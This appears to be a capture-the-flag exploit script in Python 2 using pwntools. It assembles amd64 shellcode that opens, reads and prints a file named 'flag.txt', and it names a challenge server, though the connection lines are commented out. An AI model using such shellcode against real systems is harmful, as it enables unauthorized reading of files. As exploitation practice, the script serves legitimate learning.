#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
host , port = '116.203.19.166' , 34587
#y = remote( host , port )

sc = asm(
    '''
    mov rax, 0x7478742e67616c66
    push rax

    mov rdi, rsp
    xor esi, esi
    mov al, 0x2
    syscall

    xchg edi, eax
    mov esi, 0x601000
    mov dl, 0x70
    mov al, 0x0
    syscall

    mov di, 1
    inc eax
    syscall
    '''
)

print hex( len( sc ) )

#y.interactive()